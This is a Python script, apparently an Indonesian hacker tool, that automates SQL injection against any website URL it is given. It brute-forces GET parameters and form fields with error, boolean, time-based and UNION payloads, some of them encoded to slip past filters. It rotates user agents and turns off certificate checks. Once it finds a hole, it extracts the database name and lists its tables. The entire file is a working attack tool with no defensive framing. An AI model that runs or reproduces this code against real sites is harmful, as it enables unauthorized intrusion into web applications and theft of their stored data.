#!/usr/bin/env python3
# SANGSENIMAMWARTEFAK EXPLOIT v2.0 - BRUTAL FORCE SQL INJECTION (Warna Keren)
# Untuk LO tersayang

import requests, sys, time, re, random, string, urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, quote

# ANSI Color Codes
R = '\033[91m'    # Merah (Red)
G = '\033[92m'    # Hijau (Green)
Y = '\033[93m'    # Kuning (Yellow)
B = '\033[94m'    # Biru (Blue)
M = '\033[95m'    # Magenta
C = '\033[96m'    # Cyan
W = '\033[97m'    # Putih (White)
RS = '\033[0m'    # Reset
BL = '\033[1m'    # Bold

requests.packages.urllib3.disable_warnings()

class SANGSENIMAMWARTEFAKExploit:
    def __init__(self, url, cookie=None, proxy=None):
        self.url = url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        if cookie:
            self.session.cookies.update(cookie)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'
        ]
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
        self.params_found = []
        self.injection_point = None
        self.db_name = None
        
    def _request(self, url, data=None, method='GET', timeout=15):
        time.sleep(random.uniform(0.1, 0.5))
        try:
            if method.upper() == 'GET':
                resp = self.session.get(url, timeout=timeout)
            else:
                resp = self.session.post(url, data=data, timeout=timeout)
            return resp
        except Exception:
            return None
    
    def extract_forms(self):
        resp = self._request(self.url)
        if not resp:
            return []
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action:
                full_url = urllib.parse.urljoin(self.url, action)
            else:
                full_url = self.url
            method = form.get('method', 'get').upper()
            inputs = {}
            for inp in form.find_all('input'):
                name = inp.get('name')
                if name:
                    inputs[name] = inp.get('value', '')
            forms.append((full_url, method, inputs))
        return forms
    
    def brute_force_get_params(self):
        common_params = [
            'id', 'page', 'cat', 'product', 'post', 'article', 'berita', 'detail', 'news', 'p', 'q', 'search', 's',
            'view', 'show', 'read', 'code', 'user', 'login', 'pass', 'password', 'email', 'name', 'title', 'content',
            'kategori', 'kode', 'nik', 'nip', 'no', 'ref', 'url', 'link', 'file', 'download', 'dir', 'path', 'include'
        ]
        parsed = urlparse(self.url)
        if parsed.query:
            existing = parse_qs(parsed.query)
            for param in existing.keys():
                self._test_parameter(param, 'GET')
        for param in common_params:
            test_url = f"{self.url}?{param}=1"
            self._test_parameter(param, 'GET', url=test_url)
    
    def _test_parameter(self, param, method, url=None, post_data=None):
        print(f"{C}[SANGSENIMAMWARTEFAK]{RS} Testing {Y}{method}{RS} param: {B}{param}{RS}")
        # Baseline
        if method == 'GET':
            base_url = url if url else self.url
            base_resp = self._request(base_url)
        else:
            base_resp = self._request(self.url, data=post_data, method='POST')
        if not base_resp:
            return False
        base_length = len(base_resp.text)
        
        payloads = [
            ("'", "error"),
            ("\"", "error"),
            ("1' AND 1=1-- -", "true"),
            ("1' AND 1=2-- -", "false"),
            ("1' OR '1'='1", "true"),
            ("1' OR '1'='2", "false"),
            ("1' AND SLEEP(5)-- -", "time"),
            ("1' AND BENCHMARK(5000000,MD5('a'))-- -", "time"),
            ("1' WAITFOR DELAY '0:0:5'-- -", "time"),
            ("1' AND pg_sleep(5)-- -", "time"),
            ("1' UNION SELECT NULL-- -", "union"),
            ("1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -", "union"),
            ("1' AND 1=1-- -", "bool_true"),
            ("1' AND 1=2-- -", "bool_false"),
            ("1%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%2d%2d%20%2d", "time"),
            ("1'/*!50000AND*/ SLEEP(5)-- -", "time"),
            ("1'%2527 AND SLEEP(5)-- -", "time"),
        ]
        
        for payload, ptype in payloads:
            if method == 'GET':
                if url:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    if param in qs:
                        qs[param] = [payload]
                    else:
                        qs[param] = [payload]
                    new_query = urlencode(qs, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()
                else:
                    parsed = urlparse(self.url)
                    if parsed.query:
                        qs = parse_qs(parsed.query)
                        qs[param] = [payload]
                        new_query = urlencode(qs, doseq=True)
                        test_url = parsed._replace(query=new_query).geturl()
                    else:
                        test_url = f"{self.url}?{param}={quote(payload)}"
                resp = self._request(test_url)
            else:
                if post_data is None:
                    continue
                test_data = post_data.copy()
                test_data[param] = payload
                resp = self._request(self.url, data=test_data, method='POST')
            
            if not resp:
                continue
            
            if ptype == 'time':
                start = time.time()
                if method == 'GET':
                    self._request(test_url, timeout=10)
                else:
                    self._request(self.url, data=test_data, method='POST', timeout=10)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    print(f"{R}[!!!] VULNERABLE!{RS} {param} -> {Y}TIME-BASED{RS} (delay {elapsed:.1f}s)")
                    self.params_found.append((param, method, 'time', payload))
                    self.injection_point = (param, method)
                    return True
            
            elif ptype == 'error':
                errors = ['mysql', 'sql', 'syntax', 'unclosed', 'quotation', 'division by zero', 'XPATH', 'SQLite', 'PostgreSQL', 'ORA-']
                if any(err in resp.text.lower() for err in errors):
                    print(f"{R}[!!!] VULNERABLE!{RS} {param} -> {Y}ERROR-BASED{RS}")
                    self.params_found.append((param, method, 'error', payload))
                    self.injection_point = (param, method)
                    return True
            
            elif ptype in ['true', 'false', 'bool_true', 'bool_false']:
                diff_true = abs(len(resp.text) - base_length)
                if 'true' in ptype and diff_true > 20:
                    false_payload = "1' AND 1=2-- -"
                    if method == 'GET':
                        false_parsed = urlparse(test_url)
                        false_qs = parse_qs(false_parsed.query)
                        false_qs[param] = [false_payload]
                        false_url = false_parsed._replace(query=urlencode(false_qs, doseq=True)).geturl()
                        false_resp = self._request(false_url)
                    else:
                        false_data = test_data.copy()
                        false_data[param] = false_payload
                        false_resp = self._request(self.url, data=false_data, method='POST')
                    if false_resp and abs(len(false_resp.text) - base_length) < 5:
                        print(f"{R}[!!!] VULNERABLE!{RS} {param} -> {Y}BOOLEAN BLIND{RS}")
                        self.params_found.append((param, method, 'boolean', payload))
                        self.injection_point = (param, method)
                        return True
        return False
    
    def auto_scan(self):
        # Banner warna-warni
        print()
        print(f"{R}╔══════════════════════════════════════════════════════╗{RS}")
        print(f"{R}║{RS}  {BL}{C}S A N G S E N I M A M W A R T E F A K{RS} {R}║{RS}")
        print(f"{R}║{RS}  {Y}Brutal Force SQL Injection{RS}              {R}║{RS}")
        print(f"{R}║{RS}  {G}Untuk LO tersayang{RS}                       {R}║{RS}")
        print(f"{R}╚══════════════════════════════════════════════════════╝{RS}")
        print()
        
        print(f"{C}[INFO]{RS} Target: {B}{self.url}{RS}")
        print(f"{C}[INFO]{RS} Scanning dimulai...{RS}\n")
        
        print(f"{Y}[1]{RS} Scanning GET parameters...{RS}")
        self.brute_force_get_params()
        
        if not self.params_found:
            print(f"\n{Y}[2]{RS} Scanning POST forms...{RS}")
            forms = self.extract_forms()
            for action_url, method, inputs in forms:
                if method == 'POST' and inputs:
                    for param in inputs.keys():
                        self._test_parameter(param, 'POST', post_data=inputs)
        
        if not self.params_found:
            print(f"\n{Y}[3]{RS} Deep scan dengan time-based lebih agresif...{RS}")
            aggressive = [
                ("1' AND SLEEP(10)-- -", "time"),
                ("1' AND BENCHMARK(20000000,MD5('x'))-- -", "time"),
                ("1' WAITFOR DELAY '0:0:10'-- -", "time")
            ]
            for param in ['id', 'page', 'cat', 'product', 'post', 'article']:
                for payload, ptype in aggressive:
                    test_url = f"{self.url}?{param}={quote(payload)}"
                    start = time.time()
                    self._request(test_url, timeout=15)
                    elapsed = time.time() - start
                    if elapsed >= 8:
                        print(f"{R}[!!!] DEEP SCAN: {param} -> TIME-BASED (delay {elapsed:.1f}s){RS}")
                        self.params_found.append((param, 'GET', 'time', payload))
                        self.injection_point = (param, 'GET')
                        break
                if self.params_found:
                    break
        
        if not self.params_found:
            print(f"\n{R}❌ TIDAK ADA SQL INJECTION YANG DITEMUKAN{RS}")
            print(f"   {Y}Kesimpulan:{RS} website aman atau WAF sangat kuat.")
            print(f"   {C}Coba sqlmap:{RS} sqlmap -u '{self.url}' --batch --level=5 --risk=3 --random-agent")
        else:
            param, method, inj_type, payload = self.params_found[0]
            print(f"\n{G}✅ SQL INJECTION DITEMUKAN!{RS}")
            print(f"   {C}Parameter:{RS} {B}{param}{RS} ({method})")
            print(f"   {C}Tipe:{RS} {Y}{inj_type}{RS}")
            self.extract_db_name(param, method, inj_type)
    
    def extract_db_name(self, param, method, inj_type):
        print(f"\n{C}[*]{RS} Mengekstrak nama database...{RS}")
        db_name = ""
        if inj_type == 'time':
            for pos in range(1, 50):
                found = False
                for ch in string.ascii_lowercase + string.digits + '_':
                    payload = f"1' AND IF(ASCII(SUBSTRING(database(),{pos},1))={ord(ch)}, SLEEP(3), 0)-- -"
                    test_url = f"{self.url}?{param}={quote(payload)}"
                    start = time.time()
                    self._request(test_url, timeout=8)
                    if time.time() - start >= 2.5:
                        db_name += ch
                        print(f"    {G}Database:{RS} {db_name}")
                        found = True
                        break
                if not found:
                    break
        elif inj_type == 'boolean':
            for pos in range(1, 50):
                for ch in string.ascii_lowercase + string.digits + '_':
                    payload = f"1' AND ASCII(SUBSTRING(database(),{pos},1))={ord(ch)} AND '1'='1"
                    test_url = f"{self.url}?{param}={quote(payload)}"
                    resp = self._request(test_url)
                    if resp and "error" not in resp.text.lower():
                        db_name += ch
                        print(f"    {G}Database:{RS} {db_name}")
                        break
                if len(db_name) < pos:
                    break
        elif inj_type == 'error':
            payload = f"1' AND extractvalue(1,concat(0x7e,database()))-- -"
            test_url = f"{self.url}?{param}={quote(payload)}"
            resp = self._request(test_url)
            if resp:
                match = re.search(r'~([a-zA-Z0-9_]+)', resp.text)
                if match:
                    db_name = match.group(1)
                    print(f"    {G}Database:{RS} {db_name}")
        
        self.db_name = db_name if db_name else "unknown"
        print(f"\n{G}[+] Database name:{RS} {B}{self.db_name}{RS}")
        if self.db_name and self.db_name != "unknown":
            self.dump_sample(param, method)
    
    def dump_sample(self, param, method):
        print(f"\n{C}[*]{RS} Mencoba mengambil sample data...{RS}")
        payload = f"1' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema='{self.db_name}' LIMIT 0,5-- -"
        test_url = f"{self.url}?{param}={quote(payload)}"
        resp = self._request(test_url)
        if resp:
            tables = re.findall(r'([a-zA-Z0-9_]{3,30})', resp.text)
            if tables:
                print(f"    {G}Sample tabel:{RS} {', '.join(tables[:5])}")
        with open('sangs_enimamwartefak_result.txt', 'w') as f:
            f.write(f"Target: {self.url}\nDatabase: {self.db_name}\n\n")
        print(f"\n{G}✅ Hasil tersimpan di sangs_enimamwartefak_result.txt{RS}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"{R}Penggunaan:{RS} python3 sangs_enimamwartefak.py --url 'https://target.com/page.php?id=1'")
        sys.exit(1)
    url = None
    cookie = None
    for i, arg in enumerate(sys.argv):
        if arg == '--url' and i+1 < len(sys.argv):
            url = sys.argv[i+1]
        elif arg == '--cookie' and i+1 < len(sys.argv):
            cstr = sys.argv[i+1]
            cookie = {}
            for item in cstr.split(';'):
                if '=' in item:
                    k,v = item.strip().split('=',1)
                    cookie[k] = v
    if not url:
        print(f"{R}URL tidak ditemukan. Gunakan --url '...'{RS}")
        sys.exit(1)
    exploit = SANGSENIMAMWARTEFAKExploit(url, cookie)
    exploit.auto_scan()